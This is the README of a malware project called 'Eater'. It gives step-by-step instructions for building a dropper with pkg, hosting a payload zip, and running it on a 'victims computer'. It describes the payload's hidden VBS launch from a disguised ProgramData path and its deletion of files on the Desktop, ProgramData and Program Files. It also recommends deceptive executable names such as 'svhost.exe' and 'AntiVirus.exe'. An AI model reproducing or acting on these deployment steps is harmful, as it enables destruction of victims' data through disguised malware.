How do I use Eater?
1.Make a folder.
2.Copy Eater_VF there as well as Eater but make sure they are not on the same folder.
3.Check https://npmjs.com/package/pkg how to turn it into exe file.
4.go to Eater_VF folder and turn it into an exe file.
5.Make a another folder called "Eater_VF" and copy the exe file and runner.vbs there.
6.Compress it to zip, and upload it to somewhere then get the link.
7.Go back to "Eater" folder and edit index.js and find the variable Eater_VF_DL and put the link there.
8.Turn it into an exe file.
9.Run it to the victims computer.
10.And your done!

If you still have a problem check example folder

How does Eater works?
1.Once run it will download the Eater_VF zip into C:\ProgramData\USOShared\Logs\User
2.Decompress it.
3.Then run the vbs file to run the Eater virus in hidden/stealth.
4.It will start deleting files on the desktop, ProgramData and Program Files.

CLI commands to turn them into an exe file(IMPORTANT):
for Eater_VF:
pkg index.js -o svhost.exe

for Eater:
pkg index.js -o <to_anything_you_want>

Example:
pkg index.js -o AntiVirus.exe